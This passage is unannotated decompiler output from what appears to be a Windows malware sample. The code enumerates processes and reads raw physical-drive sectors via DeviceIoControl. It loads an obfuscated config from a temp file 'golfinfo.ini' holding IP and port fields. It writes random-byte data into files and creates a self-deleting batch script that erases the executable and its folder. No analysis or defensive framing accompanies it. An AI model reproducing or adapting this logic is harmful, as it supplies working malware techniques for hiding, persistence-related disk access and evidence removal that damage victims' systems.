  local_34.lpszClassName = (LPCWSTR)&DAT_00424018;
  local_34.hIconSm = LoadIconW(local_34.hInstance,(LPCWSTR)0x6c);
  RegisterClassExW(&local_34);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00402509(void)

{
  short sVar1;
  undefined4 *puVar2;
  int iVar3;
  HANDLE pvVar4;
  undefined4 *puVar5;
  undefined local_3dc [400];
  short local_24c;
  undefined local_24a [518];
  short local_44;
  undefined local_42 [58];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  local_24c = 0;
  _memset(local_24a,0,0x206);
  Ordinal_115(0x101,local_3dc);
  iVar3 = FUN_00402a70((int *)&DAT_004249a0);
  if (iVar3 == 0) {
    local_44 = 0;
    _memset(local_42,0,0x3a);
    FUN_00403660();
    iVar3 = 0;
    do {
      sVar1 = *(short *)(local_42 + iVar3 + -2);
      *(short *)((int)&DAT_00424b48 + iVar3) = sVar1;
      iVar3 = iVar3 + 2;
    } while (sVar1 != 0);
    _wcscpy_s((wchar_t *)&DAT_004249a4,0x40,&DAT_0041ddd0);
    _wcscpy_s(&DAT_00424a26,0x10,&DAT_0041ddec);
    _wcscpy_s((wchar_t *)&DAT_00424a46,0x40,&DAT_0041ddb4);
    DAT_00424a24 = 0x51;
    DAT_00424ac6 = 0x2b70;
    iVar3 = 0;
    do {
      sVar1 = *(short *)(local_42 + iVar3 + -2);
      *(short *)((int)&DAT_00424b28 + iVar3) = sVar1;
      iVar3 = iVar3 + 2;
    } while (sVar1 != 0);
    puVar2 = (undefined4 *)0x424b26;
    do {
      puVar5 = puVar2;
      puVar2 = (undefined4 *)((int)puVar5 + 2);
    } while (*(short *)((int)puVar5 + 2) != 0);
    *(undefined4 *)((int)puVar5 + 2) = DAT_0041e0ac;
    *(undefined2 *)((int)puVar5 + 6) = DAT_0041e0b0;
    DAT_00424b68 = 5;
  }
  FUN_00403700();
  FUN_00403660();
  iVar3 = 0;
  do {
    sVar1 = *(short *)(local_24a + iVar3 + -2);
    *(short *)((int)&DAT_00424960 + iVar3) = sVar1;
    iVar3 = iVar3 + 2;
  } while (sVar1 != 0);
  pvVar4 = OpenEventW(0x20000,0,&DAT_00424960);
  if (pvVar4 == (HANDLE)0x0) {
    pvVar4 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_00424960);
    if (pvVar4 != (HANDLE)0x0) {
      DAT_00424828 = FUN_004037b0(&DAT_0041ddb4);
      FUN_00401eaf();
      _DAT_00424ba8 = DAT_00424b6c;
      CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00403b50,(LPVOID)0x0,0,
                   (LPDWORD)0x0);
    }
  }
  else {
    CloseHandle(pvVar4);
  }
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



void FUN_004026be(HWND param_1,UINT param_2,uint param_3,LPARAM param_4)

{
  tagPAINTSTRUCT local_4c;
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&stack0xfffffffc;
  if (param_2 == 2) {
    PostQuitMessage(0);
  }
  else if (param_2 == 0xf) {
    BeginPaint(param_1,&local_4c);
    EndPaint(param_1,&local_4c);
  }
  else {
    if (param_2 == 0x111) {
      if ((param_3 & 0xffff) == 0x68) {
        DialogBoxParamW(DAT_004241a8,(LPCWSTR)0x67,param_1,FUN_00402762,0);
        goto LAB_00402753;
      }
      if ((param_3 & 0xffff) == 0x69) {
        DestroyWindow(param_1);
        goto LAB_00402753;
      }
      param_2 = 0x111;
    }
    DefWindowProcW(param_1,param_2,param_3,param_4);
  }
LAB_00402753:
  ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);
  return;
}



undefined4 FUN_00402762(HWND param_1,int param_2,ushort param_3)

{
  if (param_2 != 0x110) {
    if ((param_2 != 0x111) || ((param_3 != 1 && (param_3 != 2)))) {
      return 0;
    }
    EndDialog(param_1,(uint)param_3);
  }
  return 1;
}



void __cdecl FUN_00402799(wchar_t *param_1,wchar_t *param_2)

{
  _vswprintf_s(param_1,0x104,param_2,&stack0x0000000c);
  return;
}



undefined4 FUN_004027b4(void)

{
  short *psVar1;
  short *psVar2;
  errno_t eVar3;
  void **unaff_ESI;
  undefined2 local_1c;
  undefined4 local_1a;
  undefined2 uStack_16;
  undefined2 uStack_14;
  undefined2 local_12;
  undefined2 uStack_10;
  FILE *local_8;
  
  local_8 = (FILE *)0x0;
  psVar1 = &DAT_0041dce8;
  do {
    psVar2 = psVar1;
    psVar1 = psVar2 + 1;
  } while (*psVar2 != 0);
  if (((int)(psVar2 + -0x20ee74) >> 1 != 0) &&
     (eVar3 = __wfopen_s(&local_8,&DAT_0041dce8,(wchar_t *)&DAT_0041dcec), eVar3 == 0)) {
    uStack_16 = 0;
    uStack_14 = 0;
    local_1c = 0x4d42;
    local_1a = (int)unaff_ESI[1] + 0xe;
    local_12 = 0x36;
    uStack_10 = 0;
    _fwrite(&local_1c,0xe,1,local_8);
    _fwrite(*unaff_ESI,(size_t)unaff_ESI[1],1,local_8);
    _fclose(local_8);
    return 1;
  }
  return 0;
}



void __fastcall FUN_00402844(int *param_1)

{
  HANDLE hObject;
  int iVar1;
  int iVar2;
  int *_Str2;
  undefined4 local_234 [2];
  int local_22c;
  wchar_t local_210 [42];
  undefined local_1bc [436];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_1bc;
  hObject = (HANDLE)CreateToolhelp32Snapshot(2,0);
  if (hObject == (HANDLE)0xffffffff) {
    GetCurrentProcessId();
    GetLastError();
  }
  else {
    _memset(local_234,0,0x22c);
    local_234[0] = 0x22c;
    iVar1 = Process32FirstW(hObject,local_234);
    while (iVar1 == 1) {
      iVar1 = 0;
      if (0 < *param_1) {
        _Str2 = param_1 + 1;
        do {
          iVar2 = __wcsicmp(local_210,(wchar_t *)_Str2);
          if (iVar2 == 0) {
            param_1[0x283] = iVar1;
            _wcscpy_s((wchar_t *)(param_1 + 0x285),0x40,local_210);
            param_1[0x284] = local_22c;
            _wcscpy_s((wchar_t *)(param_1 + 0x2a6),0x40,
                      (wchar_t *)(param_1 + param_1[0x283] * 0x20 + 0x141));
            goto LAB_004028e3;
          }
          iVar1 = iVar1 + 1;
          _Str2 = _Str2 + 0x20;
        } while (iVar1 < *param_1);
      }
      iVar1 = Process32NextW(hObject,local_234);
    }
    GetLastError();
LAB_004028e3:
    CloseHandle(hObject);
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_1bc);
  return;
}



void FUN_00402960(void)

{
  BOOL BVar1;
  undefined4 *unaff_ESI;
  _OSVERSIONINFOW local_120;
  ushort uStack_c;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_120;
  *unaff_ESI = 0;
  _memset(&local_120.dwMajorVersion,0,0x118);
  local_120.dwOSVersionInfoSize = 0x11c;
  BVar1 = GetVersionExW(&local_120);
  if (BVar1 != 0) {
    if (local_120.dwMajorVersion == 5) {
      if (local_120.dwMinorVersion == 0) {
        if (3 < uStack_c) {
          *unaff_ESI = 1;
          ___security_check_cookie_4(local_4 ^ (uint)&local_120);
          return;
        }
      }
      else {
        if (local_120.dwMinorVersion == 2) {
          *unaff_ESI = 2;
          *unaff_ESI = 3;
          ___security_check_cookie_4(local_4 ^ (uint)&local_120);
          return;
        }
        if ((1 < local_120.dwMinorVersion) || (local_120.dwMinorVersion == 1)) {
          *unaff_ESI = 3;
          ___security_check_cookie_4(local_4 ^ (uint)&local_120);
          return;
        }
      }
    }
    else if (local_120.dwMajorVersion == 6) {
      if (local_120.dwMinorVersion == 0) {
        *unaff_ESI = 4;
        ___security_check_cookie_4(local_4 ^ (uint)&local_120);
        return;
      }
      if (local_120.dwMinorVersion == 1) {
        *unaff_ESI = 5;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_120);
  return;
}



void __fastcall FUN_00402a70(int *param_1)

{
  int iVar1;
  uint uVar2;
  int *piVar3;
  int local_20c [129];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)local_20c;
  if (param_1 != (int *)0x0) {
    _memset(local_20c,0,0x200);
    iVar1 = FUN_00402b20();
    if (iVar1 != 0) {
      uVar2 = 0;
      do {
        *(byte *)((int)local_20c + uVar2) = ~*(byte *)((int)local_20c + uVar2);
        uVar2 = uVar2 + 1;
      } while (uVar2 < 0x200);
      if (local_20c[0] == 0x504d534d) {
        piVar3 = local_20c;
        for (iVar1 = 0x80; iVar1 != 0; iVar1 = iVar1 + -1) {
          *param_1 = *piVar3;
          piVar3 = piVar3 + 1;
          param_1 = param_1 + 1;
        }
        ___security_check_cookie_4(local_8 ^ (uint)local_20c);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_8 ^ (uint)local_20c);
  return;
}



void FUN_00402b20(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  void *unaff_ESI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_214[0] = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    pwVar1 = u_golfinfo_ini_0041ff6c;
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x20ffb6) >> 1 != 0) {
      GetTempPathW(0x104,&local_20c);
      _wcscat_s(&local_20c,0x104,u_golfinfo_ini_0041ff6c);
      __wfopen_s(local_214,&local_20c,(wchar_t *)&DAT_00420274);
      if (local_214[0] != (FILE *)0x0) {
        _fread(unaff_ESI,0x200,1,local_214[0]);
        _fclose(local_214[0]);
        ___security_check_cookie_4(local_4 ^ (uint)local_214);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



undefined4 __cdecl FUN_00402c10(undefined4 *param_1)

{
  short sVar1;
  HANDLE in_EAX;
  undefined4 *_Dst;
  uint uVar2;
  int iVar3;
  short *psVar4;
  undefined4 uVar5;
  undefined4 *puVar6;
  
  uVar5 = 0;
  if (in_EAX == (HANDLE)0xffffffff) {
    return 0;
  }
  _Dst = (undefined4 *)operator_new(0x400);
  _memset(_Dst,0,0x400);
  uVar2 = FUN_00402d90(in_EAX);
  iVar3 = FUN_00402ed0(uVar2,_Dst);
  if (iVar3 == 0) goto LAB_00402cc5;
  if (_Dst[1] == 0x5042475f) {
    psVar4 = (short *)((int)_Dst + 0x10e);
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 == 0) goto LAB_00402c81;
  }
  else {
LAB_00402c81:
    iVar3 = FUN_00402ed0(0x1e,_Dst);
    if ((iVar3 == 0) || (_Dst[1] != 0x5042475f)) goto LAB_00402cc5;
    psVar4 = (short *)((int)_Dst + 0x10e);
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 == 0) goto LAB_00402cc5;
  }
  puVar6 = _Dst;
  for (iVar3 = 0x8d; iVar3 != 0; iVar3 = iVar3 + -1) {
    *param_1 = *puVar6;
    puVar6 = puVar6 + 1;
    param_1 = param_1 + 1;
  }
  *(undefined2 *)param_1 = *(undefined2 *)puVar6;
  uVar5 = 1;
LAB_00402cc5:
  if (_Dst != (undefined4 *)0x0) {
    FUN_00409875(_Dst);
  }
  return uVar5;
}



void FUN_00402ce0(void)

{
  int iVar1;
  undefined4 *unaff_ESI;
  undefined4 local_218;
  WCHAR local_214;
  undefined local_212 [522];
  uint local_8;
  
  local_8 = DAT_00422040 ^ (uint)&local_218;
  local_214 = L'\0';
  _memset(local_212,0,0x206);
  local_218 = 0;
  GetSystemDirectoryW(&local_214,0x104);
  FUN_00402f30(local_214 + L'﾿');
  iVar1 = FUN_00403040();
  if (iVar1 == -1) {
    ___security_check_cookie_4(local_8 ^ (uint)&local_218);
    return;
  }
  FUN_00402c10(unaff_ESI);
  ___security_check_cookie_4(local_8 ^ (uint)&local_218);
  return;
}



undefined4 __cdecl FUN_00402d90(HANDLE param_1)

{
  int iVar1;
  uint uVar2;
  void *lpOutBuffer;
  BOOL BVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  undefined8 uVar8;
  undefined4 uStack_10;
  DWORD DStack_c;
  uint uStack_8;
  
  Sleep(100);
  iVar6 = 0;
  iVar7 = 0;
  uVar5 = 0;
  uStack_10 = 0;
  uStack_8 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    lpOutBuffer = operator_new(0xc00);
    BVar3 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,lpOutBuffer,0xc00,&DStack_c,
                            (LPOVERLAPPED)0x0);
    if (BVar3 != 0) {
      iVar1 = *(int *)((int)lpOutBuffer + 0x3c);
      uVar4 = uStack_8;
      if ((-1 < iVar1) && ((0 < iVar1 || (*(uint *)((int)lpOutBuffer + 0x38) != 0)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x40);
        iVar6 = *(int *)((int)lpOutBuffer + 0x44);
        uVar4 = *(uint *)((int)lpOutBuffer + 0x38);
        iVar7 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0xcc);
      uVar2 = *(uint *)((int)lpOutBuffer + 200);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0xd0);
        iVar6 = *(int *)((int)lpOutBuffer + 0xd4);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x15c);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x158);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x160);
        iVar6 = *(int *)((int)lpOutBuffer + 0x164);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x1ec);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x1e8);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x1f0);
        iVar6 = *(int *)((int)lpOutBuffer + 500);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      uVar8 = __alldiv(uVar5 + uVar4,iVar6 + iVar7 + (uint)CARRY4(uVar5,uVar4),0x200,0);
      uStack_10 = (undefined4)uVar8;
    }
    if (lpOutBuffer != (void *)0x0) {
      FUN_00409875(lpOutBuffer);
    }
  }
  Sleep(100);
  return uStack_10;
}



void __cdecl FUN_00402ed0(uint param_1,LPVOID param_2)

{
  HANDLE unaff_ESI;
  DWORD local_18;
  _OVERLAPPED local_14;
  
  local_14.Internal = 0;
  local_14.InternalHigh = 0;
  local_14.hEvent = (HANDLE)0x0;
  local_18 = 0;
  if (unaff_ESI != (HANDLE)0xffffffff) {
    local_14.u = (_union_518)((ulonglong)param_1 * 0x200);
    ReadFile(unaff_ESI,param_2,0x400,&local_18,&local_14);
  }
  return;
}



void __cdecl FUN_00402f30(short param_1)

{
  HANDLE hDevice;
  BOOL BVar1;
  undefined4 *unaff_EBX;
  DWORD DStack_438;
  undefined4 local_434;
  undefined2 local_430;
  wchar_t local_42c;
  undefined4 local_42a;
  undefined4 local_426;
  undefined4 local_422;
  undefined4 local_41e;
  undefined4 local_41a;
  undefined4 local_416;
  undefined4 local_412;
  undefined4 local_40e;
  undefined4 local_40a;
  undefined2 local_406;
  undefined auStack_404 [8];
  undefined4 uStack_3fc;
  uint uStack_3f4;
  uint uStack_3f0;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&DStack_438;
  local_430 = DAT_004202c0;
  local_42a = 0;
  local_426 = 0;
  local_422 = 0;
  local_41e = 0;
  local_41a = 0;
  local_416 = 0;
  local_412 = 0;
  local_40e = 0;
  local_40a = 0;
  local_406 = 0;
  local_42c = L'\0';
  local_434 = CONCAT22((short)((uint)DAT_004202bc >> 0x10),param_1 + 0x41);
  FUN_00404e70(&local_434,&local_42c,u______s_004202c4);
  hDevice = CreateFileW(&local_42c,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,auStack_404,0x400,&DStack_438,
                            (LPOVERLAPPED)0x0);
    if (BVar1 != 0) {
      __alldiv(uStack_3f4,uStack_3f0,0x200,0);
      *unaff_EBX = uStack_3fc;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&DStack_438);
  return;
}



void FUN_00403040(void)

{
  int iVar1;
  int unaff_EBX;
  undefined4 *puVar2;
  undefined4 *puVar3;
  wchar_t local_40;
  undefined4 local_3e;
  undefined4 local_3a;
  undefined4 local_36;
  undefined4 local_32;
  undefined2 local_2e;
  undefined4 local_2c [9];
  undefined4 local_8;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_40;
  puVar2 = (undefined4 *)u_____PHYSICALDRIVE_004202d4;
  puVar3 = local_2c;
  for (iVar1 = 9; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar3 = *puVar2;
    puVar2 = puVar2 + 1;
    puVar3 = puVar3 + 1;
  }
  local_8 = 0;
  local_40 = L'\0';
  local_3e = 0;
  local_3a = 0;
  local_36 = 0;
  local_32 = 0;
  local_2e = 0;
  if (-1 < unaff_EBX) {
    __itow_s(unaff_EBX,&local_40,10,10);
    _wcscat_s((wchar_t *)local_2c,0x14,&local_40);
    if (unaff_EBX != 0) {
      CreateFileW((LPCWSTR)local_2c,0xc0000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
      ___security_check_cookie_4(local_4 ^ (uint)&local_40);
      return;
    }
    CreateFileW((LPCWSTR)local_2c,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_40);
  return;
}



void __fastcall FUN_00403100(uint param_1)

{
  wchar_t *unaff_ESI;
  wchar_t local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_24;
  local_24 = L'\0';
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  FUN_00404e90(param_1 >> 0x18,&local_24,u__d__d__d__d_004202f8);
  _wcscpy_s(unaff_ESI,0x10,&local_24);
  ___security_check_cookie_4(local_4 ^ (uint)&local_24);
  return;
}



void __cdecl FUN_00403180(int param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar3;
  int iVar4;
  int iVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  int local_68 [4];
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_68[1] = 0xffffffff;
  local_68[2] = 0xffffffff;
  local_68[3] = 0xffffffff;
  local_54 = 0xffffffff;
  local_50 = 0xffffffff;
  local_4c = 0xffffffff;
  local_44 = 0xffffffff;
  local_40 = 0xffffffff;
  local_3c = 0xffffffff;
  local_38 = 0xffffffff;
  local_34 = 0xffffffff;
  local_2c = 0xffffffff;
  local_28 = 0xffffffff;
  local_24 = 0xffffffff;
  local_20 = 0xffffffff;
  local_1c = 0xffffffff;
  local_14 = 0xffffffff;
  local_10 = 0xffffffff;
  local_c = 0xffffffff;
  local_4 = 0xffffffff;
  local_8 = 1;
  local_18 = 1;
  local_30 = 1;
  local_48 = 1;
  local_58 = 1;
  local_68[0] = 1;
  _rand();
  uVar6 = FUN_00417090(extraout_ECX,extraout_EDX);
  iVar4 = 0;
  iVar5 = 0;
  if (0 < (int)uVar6) {
    do {
      _rand();
      uVar7 = FUN_00417090(extraout_ECX_00,extraout_EDX_00);
      iVar2 = (int)uVar7;
      uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
      iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      while (1 < iVar1) {
        iVar2 = iVar2 + 1;
        if (iVar2 == 0x1a) {
          iVar2 = 0;
        }
        uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
        iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      }
      iVar4 = iVar4 + local_68[iVar2];
      *(short *)(param_1 + iVar5 * 2) = (short)iVar2 + 0x61;
      iVar5 = iVar5 + 1;
    } while (iVar5 < (int)uVar6);
  }
  return;
}



undefined4 __cdecl FUN_004032b0(wchar_t *param_1)

{
  wchar_t *in_EAX;
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  FILE *local_4;
  
  local_4 = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_4,in_EAX,(wchar_t *)&DAT_00420344);
  if (eVar1 != 0) {
    return 0;
  }
  _fseek(local_4,0,2);
  _ElementSize = _ftell(local_4);
  _fseek(local_4,0,0);
  _DstBuf = _malloc(_ElementSize + 0x32);
  _fread(_DstBuf,_ElementSize,1,local_4);
  _fclose(local_4);
  FUN_00403380();
  eVar1 = __wfopen_s(&local_4,param_1,(wchar_t *)&DAT_0042034c);
  if (eVar1 != 0) {
    return 0;
  }
  _fwrite(_DstBuf,_ElementSize + 0x32,1,local_4);
  _fclose(local_4);
  return 1;
}



void FUN_00403380(void)

{
  size_t in_EAX;
  DWORD DVar1;
  int iVar2;
  void *unaff_EBX;
  int iVar3;
  int iVar4;
  
  _memset(unaff_EBX,0,in_EAX);
  iVar4 = (int)(in_EAX + ((int)in_EAX >> 0x1f & 3U)) >> 2;
  DVar1 = GetTickCount();
  FUN_004097e0(DVar1);
  iVar3 = 0;
  if (0 < iVar4) {
    do {
      iVar2 = _rand();
      *(int *)((int)unaff_EBX + iVar3 * 4) = iVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar4);
  }
  return;
}



void FUN_004033d0(void)

{
  char cVar1;
  undefined4 *puVar2;
  char *pcVar3;
  FILE *_File;
  uint uVar4;
  undefined4 *puVar5;
  undefined4 *puVar6;
  undefined4 local_320 [3];
  undefined2 local_314;
  CHAR local_310 [259];
  undefined4 uStack_20d;
  char local_108 [260];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)local_320;
  local_320[1] = s__sannuyex_bat_00420354._4_4_;
  local_320[0] = s__sannuyex_bat_00420354._0_4_;
  local_320[2] = s__sannuyex_bat_00420354._8_4_;
  local_314 = s__sannuyex_bat_00420354._12_2_;
  local_310[0] = '\0';
  _memset(local_310 + 1,0,0x103);
  uStack_20d._1_1_ = 0;
  _memset((void *)((int)&uStack_20d + 2),0,0x103);
  local_108[0] = '\0';
  _memset(local_108 + 1,0,0x103);
  puVar2 = local_320;
  GetTempPathA(0x104,(LPSTR)((int)&uStack_20d + 1));
  do {
    cVar1 = *(char *)puVar2;
    puVar2 = (undefined4 *)((int)puVar2 + 1);
  } while (cVar1 != '\0');
  puVar6 = &uStack_20d;
  do {
    pcVar3 = (char *)((int)puVar6 + 1);
    puVar6 = (undefined4 *)((int)puVar6 + 1);
  } while (*pcVar3 != '\0');
  puVar5 = local_320;
  for (uVar4 = (uint)((int)puVar2 - (int)local_320) >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {
    *puVar6 = *puVar5;
    puVar5 = puVar5 + 1;
    puVar6 = puVar6 + 1;
  }
  for (uVar4 = (int)puVar2 - (int)local_320 & 3; uVar4 != 0; uVar4 = uVar4 - 1) {
    *(undefined *)puVar6 = *(undefined *)puVar5;
    puVar5 = (undefined4 *)((int)puVar5 + 1);
    puVar6 = (undefined4 *)((int)puVar6 + 1);
  }
  GetModuleFileNameA((HMODULE)0x0,local_310,0x104);
  _strcpy_s(local_108,0x104,local_310);
  pcVar3 = _strrchr(local_108,0x5c);
  if (pcVar3 != (char *)0x0) {
    *pcVar3 = '\0';
  }
  _File = _fopen((char *)((int)&uStack_20d + 1),&DAT_00420364);
  if (_File != (FILE *)0x0) {
    _fwrite(s__Repeat_00420368,9,1,_File);
    _fwrite(s_del___00420374,5,1,_File);
    pcVar3 = local_310;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    _fwrite(local_310,(int)pcVar3 - (int)(local_310 + 1),1,_File);
    _fwrite(&DAT_0042037c,2,1,_File);
    _fwrite(s_if_exist___00420380,10,1,_File);
    pcVar3 = local_310;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    _fwrite(local_310,(int)pcVar3 - (int)(local_310 + 1),1,_File);
    _fwrite(s___goto_Repeat_0042038c,0xf,1,_File);
    _fwrite(s_rmdir___0042039c,7,1,_File);
    pcVar3 = local_108;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    _fwrite(local_108,(int)pcVar3 - (int)(local_108 + 1),1,_File);
    _fwrite(&DAT_004203a4,3,1,_File);
    _fwrite(s_del___004203a8,5,1,_File);
    pcVar3 = (char *)((int)&uStack_20d + 1);
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    _fwrite((void *)((int)&uStack_20d + 1),(int)pcVar3 - ((int)&uStack_20d + 2),1,_File);
    _fwrite(&DAT_004203b0,1,1,_File);
    _fclose(_File);
    ShellExecuteA((HWND)0x0,&DAT_004203b4,(LPCSTR)((int)&uStack_20d + 1),(LPCSTR)0x0,(LPCSTR)0x0,0);
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_320);
  return;
}



void FUN_00403660(void)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  int iVar4;
  int unaff_EDI;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00422040 ^ (uint)&local_20c;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  pwVar2 = _wcsrchr(&local_20c,L'\\');
  *pwVar2 = L'\0';
  pwVar2 = pwVar2 + 1;
  pwVar3 = _wcsrchr(pwVar2,L'.');
  *pwVar3 = L'\0';
  iVar4 = unaff_EDI - (int)pwVar2;
  do {
    wVar1 = *pwVar2;
    *(wchar_t *)(iVar4 + (int)pwVar2) = wVar1;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_4 ^ (uint)&local_20c);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00403700(void)

{
  short *psVar1;
  int iVar2;
  
  _DAT_00424730 = DAT_00424b68;
  DAT_00424828 = FUN_004037b0(&DAT_00424a46);
  DAT_0042482c = DAT_00424ac6;
  DAT_0042482e = FUN_004037b0(&DAT_004249a4);
  DAT_00424832 = (uint)DAT_00424a24;
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00424a26 + iVar2);
    *(short *)((int)&DAT_00424836 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00424b48 + iVar2);
    *(short *)((int)&DAT_00424856 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00424b28 + iVar2);
    *(short *)((int)&DAT_00424876 + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  return;
}



uint FUN_004037b0(undefined4 param_1)

{
  undefined4 *puVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  wchar_t *local_14;
  wchar_t *local_10 [4];
  
  local_10[0] = (wchar_t *)0x0;
  local_10[1] = (wchar_t *)0x0;
  local_10[2] = (wchar_t *)0x0;
  local_10[3] = (wchar_t *)0x0;
  iVar2 = 0;
  do {
    puVar1 = (undefined4 *)operator_new(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_10[iVar2] = (wchar_t *)puVar1;
    puVar1[5] = 0;
    iVar2 = iVar2 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar2 < 4);
  iVar2 = FUN_004038b0((int)local_10);
  if (iVar2 != 4) {
    return 0;
  }
  lVar3 = __wcstoi64(local_10[0],&local_14,10);
  lVar4 = __wcstoi64(local_10[1],&local_14,10);
  lVar5 = __wcstoi64(local_10[2],&local_14,10);
  lVar6 = __wcstoi64(local_10[3],&local_14,10);
  iVar2 = 0;
  do {
